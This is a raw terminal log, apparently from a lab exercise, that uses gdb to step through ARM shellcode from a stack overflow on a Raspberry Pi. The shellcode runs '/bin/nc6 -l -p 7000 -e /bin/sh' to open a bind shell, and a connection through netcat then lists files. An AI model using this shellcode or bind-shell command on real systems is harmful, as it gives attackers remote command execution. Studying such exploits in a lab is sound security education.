0xbefff6ac:     0x0cc1e200      0x455ccbce      0x95210e2b      0x0ffcd8a8
0xbefff6bc:     0x6c3776d9      0x6f682f00      0x702f656d      0x65442f69
0xbefff6cc:     0x6f746b73      0x73632f70      0x7261742f      0x00746567
(gdb) stepi
0xbefff5e0 in ?? ()
(gdb)
0xbefff5e4 in ?? ()
(gdb) x /32x $pc
0xbefff5e4:     0xe51f7064      0xe0847007      0xe51f0050      0xe0840000
0xbefff5f4:     0xe5807000      0xe51f7074      0xe0847007      0xe51f0060
0xbefff604:     0xe0840000      0xe5807000      0xe51f7084      0xe0847007
0xbefff614:     0xe51f0070      0xe0840000      0xe5807000      0xe51f7094
0xbefff624:     0xe0847007      0xe51f0080      0xe0840000      0xe5807000
0xbefff634:     0xe51f70a4      0xe0847007      0xe51f0090      0xe0840000
0xbefff644:     0xe5807000      0xe51f70b4      0xe0847007      0xe51f00a0
0xbefff654:     0xe0840000      0xe5807000      0xe51f00a8      0xe0222002
(gdb) x /32i $pc
=> 0xbefff5e4:  ldr     r7, [pc, #-100] ; 0xbefff588
   0xbefff5e8:  add     r7, r4, r7
   0xbefff5ec:  ldr     r0, [pc, #-80]  ; 0xbefff5a4
   0xbefff5f0:  add     r0, r4, r0
   0xbefff5f4:  str     r7, [r0]
   0xbefff5f8:  ldr     r7, [pc, #-116] ; 0xbefff58c
   0xbefff5fc:  add     r7, r4, r7
   0xbefff600:  ldr     r0, [pc, #-96]  ; 0xbefff5a8
   0xbefff604:  add     r0, r4, r0
   0xbefff608:  str     r7, [r0]
   0xbefff60c:  ldr     r7, [pc, #-132] ; 0xbefff590
   0xbefff610:  add     r7, r4, r7
   0xbefff614:  ldr     r0, [pc, #-112] ; 0xbefff5ac
   0xbefff618:  add     r0, r4, r0
   0xbefff61c:  str     r7, [r0]
   0xbefff620:  ldr     r7, [pc, #-148] ; 0xbefff594
   0xbefff624:  add     r7, r4, r7
   0xbefff628:  ldr     r0, [pc, #-128] ; 0xbefff5b0
   0xbefff62c:  add     r0, r4, r0
   0xbefff630:  str     r7, [r0]
   0xbefff634:  ldr     r7, [pc, #-164] ; 0xbefff598
   0xbefff638:  add     r7, r4, r7
   0xbefff63c:  ldr     r0, [pc, #-144] ; 0xbefff5b4
   0xbefff640:  add     r0, r4, r0
   0xbefff644:  str     r7, [r0]
   0xbefff648:  ldr     r7, [pc, #-180] ; 0xbefff59c
   0xbefff64c:  add     r7, r4, r7
   0xbefff650:  ldr     r0, [pc, #-160] ; 0xbefff5b8
   0xbefff654:  add     r0, r4, r0
   0xbefff658:  str     r7, [r0]
   0xbefff65c:  ldr     r0, [pc, #-168] ; 0xbefff5bc
   0xbefff660:  eor     r2, r2, r2
(gdb)
   0xbefff664:  ldr     r0, [pc, #-228] ; 0xbefff588
   0xbefff668:  add     r0, r4, r0
   0xbefff66c:  ldr     r1, [pc, #-208] ; 0xbefff5a4
   0xbefff670:  add     r1, r4, r1
   0xbefff674:  mov     r7, #111        ; 0x6f
   0xbefff678:  sub     r7, r7, #100    ; 0x64
   0xbefff67c:  eor     r4, r4, r4
   0xbefff680:  svc     0x00000000
   0xbefff684:  strbtvc r6, [lr], #-2364        ; 0xfffff6c4
   0xbefff688:  andeq   r0, r0, r10
   0xbefff68c:  cdplt   15, 15, cr15, cr15, cr1, {7}
   0xbefff690:  andeq   r0, r0, pc
   0xbefff694:  mrclt   6, 7, APSR_nzcv, cr15, cr13, {5}
   0xbefff698:  andeq   r0, r0, r0
   0xbefff69c:  andeq   r0, r0, r0
   0xbefff6a0:  andeq   r0, r0, r0
   0xbefff6a4:  andeq   r0, r0, r0
   0xbefff6a8:  andeq   r0, r0, r0
   0xbefff6ac:  sfmeq   f6, 3, [r1], {0}
   0xbefff6b0:  ldrbmi  r12, [r12, #-3022]      ; 0xfffff432
   0xbefff6b4:  strls   r0, [r1, #-3627]!       ; 0xfffff1d5
   0xbefff6b8:  svceq   0x00fcd8a8
   0xbefff6bc:  ldcvs   6, cr7, [r7], #-868     ; 0xfffffc9c
   0xbefff6c0:  svcvs   0x00682f00
   0xbefff6c4:  eorvc   r6, pc, sp, ror #10
   0xbefff6c8:  strbvs  r2, [r4, #-3945]        ; 0xfffff097
   0xbefff6cc:  svcvs   0x00746b73
   0xbefff6d0:  cmnvc   r3, #112, 30    ; 0x1c0
   0xbefff6d4:  rsbvc   r7, r1, #788529152      ; 0x2f000000
   0xbefff6d8:  rsbseq  r6, r4, r7, ror #10
   0xbefff6dc:  mcrrmi  8, 5, r4, r5, cr3
   0xbefff6e0:  eorvs   r3, pc, #76, 26 ; 0x1300
(gdb) b *0xbefff660:
A syntax error in expression, near `:'.
(gdb) b *0xbefff660
Breakpoint 3 at 0xbefff660
(gdb) c
Continuing.

Breakpoint 3, 0xbefff660 in ?? ()
(gdb) stepi
0xbefff664 in ?? ()
(gdb) info registers
r0             0xfffffe88          4294966920
r1             0x0                 0
r2             0x0                 0
r3             0x2002              8194
r4             0xbefff5cc          3204445644
r5             0x10720             67360
r6             0x10434             66612
r7             0xbefff473          3204445299
r8             0x0                 0
r9             0x0                 0
r10            0xb6fff000          3070226432
r11            0xbefff500          3204445440
r12            0xa                 10
sp             0xbefff418          0xbefff418
lr             0xb6eb87b4          -1226078284
pc             0xbefff664          0xbefff664
cpsr           0x60000010          1610612752
fpscr          0x0                 0
(gdb) stepi
0xbefff668 in ?? ()
(gdb)
0xbefff66c in ?? ()
(gdb)
0xbefff670 in ?? ()
(gdb)
0xbefff674 in ?? ()
(gdb)
0xbefff678 in ?? ()
(gdb)
0xbefff67c in ?? ()
(gdb)
0xbefff680 in ?? ()
(gdb) info registers
r0             0xbefff45c          3204445276
r1             0xbefff434          3204445236
r2             0x0                 0
r3             0x2002              8194
r4             0x0                 0
r5             0x10720             67360
r6             0x10434             66612
r7             0xb                 11
r8             0x0                 0
r9             0x0                 0
r10            0xb6fff000          3070226432
r11            0xbefff500          3204445440
r12            0xa                 10
sp             0xbefff418          0xbefff418
lr             0xb6eb87b4          -1226078284
pc             0xbefff680          0xbefff680
cpsr           0x60000010          1610612752
fpscr          0x0                 0
(gdb) x /32s $r1
0xbefff434:     "\\\364\377\276e\364\377\276h\364\377\276k\364\377\276p\364\377\276s\364\377\276"
0xbefff44d:     ""
0xbefff44e:     ""
0xbefff44f:     ""
0xbefff450:     "env>"
0xbefff455:     ""
0xbefff456:     ""
0xbefff457:     ""
0xbefff458:     "arg>/bin/nc6"
0xbefff465:     "-l"
0xbefff468:     "-p"
0xbefff46b:     "7000"
0xbefff470:     "-e"
0xbefff473:     "/bin/sh"
0xbefff47b:     "nop>"
0xbefff480:     ""
0xbefff481:     ""
0xbefff482:     ""
0xbefff483:     ""
0xbefff484:     ""
0xbefff485:     ""
0xbefff486:     "\240", <incomplete sequence \341>
0xbefff489:     ""
0xbefff48a:     "\240", <incomplete sequence \341>
0xbefff48d:     ""
0xbefff48e:     "\240", <incomplete sequence \341>
0xbefff491:     ""
0xbefff492:     "\240", <incomplete sequence \341>
0xbefff495:     ""
0xbefff496:     "\240", <incomplete sequence \341>
0xbefff499:     ""
0xbefff49a:     "\240", <incomplete sequence \341>
(gdb) stepi
process 1581 is executing new program: /bin/nc6

[1]+  Fermato                 gdb target
pi@raspberrypi:~/Desktop/cs $ fg
gdb target
Error in re-setting breakpoint 1: No source file named /home/pi/Desktop/cs/target.c.

[1]+  Fermato                 gdb target
pi@raspberrypi:~/Desktop/cs $ fg
gdb target
Error in re-setting breakpoint 2: No source file named /home/pi/Desktop/cs/target.c.
[Detaching after fork from child process 1657]

Program received signal SIGPIPE, Broken pipe.
0xb6f1de78 in __GI___writev (fd=<optimized out>, iov=0xbeffe6c8, iovcnt=1)
    at ../sysdeps/unix/sysv/linux/writev.c:26
26      ../sysdeps/unix/sysv/linux/writev.c: File o directory non esistente.
(gdb) c
Continuing.
[Inferior 1 (process 1581) exited with code 01]
(gdb) quit
pi@raspberrypi:~/Desktop/cs $ 

----------------------------------

pi@raspberrypi:~ $ ps -P 1305
  PID PSR TTY      STAT   TIME COMMAND
 1305   2 pts/0    t      0:00 /bin/nc6 -l -p 7000 -e /bin/sh
pi@raspberrypi:~ $ nc localhost 7000
ls
96d494d7-0797-4afa-9368-70813fdc7b31
Makefile
arm.o
arm_rpi4.o
exploitarm
exploitarm_rpi4
exploitarm_rpi4_nc6
hex2echo
runshellEBP+.S
runshellEBP+mod.S
runshellEBP+mod.txt
runshellEBP.S
runshell_arm.S
runshell_arm.txt
runshell_arm_20231102-1233.S
runshell_arm_test.S
target
target.c
ls -l
total 144
-rw-r--r-- 1 pi pi  2348 Oct 26 19:02 96d494d7-0797-4afa-9368-70813fdc7b31
-rw-r--r-- 1 pi pi  1264 Oct 14  2017 Makefile
-rw-r--r-- 1 pi pi  2220 Nov  2 19:06 arm.o
-rw-r--r-- 1 pi pi  2188 Nov  2 23:07 arm_rpi4.o
-rw-r--r-- 1 pi pi   693 Nov  2 17:04 exploitarm
-rw-r--r-- 1 pi pi   693 Nov  2 19:14 exploitarm_rpi4
-rw-r--r-- 1 pi pi   661 Nov  2 23:11 exploitarm_rpi4_nc6
-rw-r--r-- 1 pi pi   815 Sep  7  2005 hex2echo
-rw-r--r-- 1 pi pi  3105 Oct 26 18:42 runshellEBP+.S
-rw-r--r-- 1 pi pi  3896 Oct 27 13:26 runshellEBP+mod.S
-rw-r--r-- 1 pi pi 10088 Nov  2 15:34 runshellEBP+mod.txt
-rw-r--r-- 1 pi pi  7620 Sep  7  2005 runshellEBP.S
-rw-r--r-- 1 pi pi  5677 Nov  2 23:06 runshell_arm.S
-rw-r--r-- 1 pi pi 49768 Nov  2 17:57 runshell_arm.txt
-rw-r--r-- 1 pi pi  4062 Nov  2 12:33 runshell_arm_20231102-1233.S
-rw-r--r-- 1 pi pi  3094 Nov  2 15:29 runshell_arm_test.S
-rwxr-xr-x 1 pi pi  9212 Nov  2 23:15 target
-rw-r--r-- 1 pi pi  2095 Nov  2 19:33 target.c
pwd
/home/pi/Desktop/cs
exit
exit

pi@raspberrypi:~ $

----------------------------------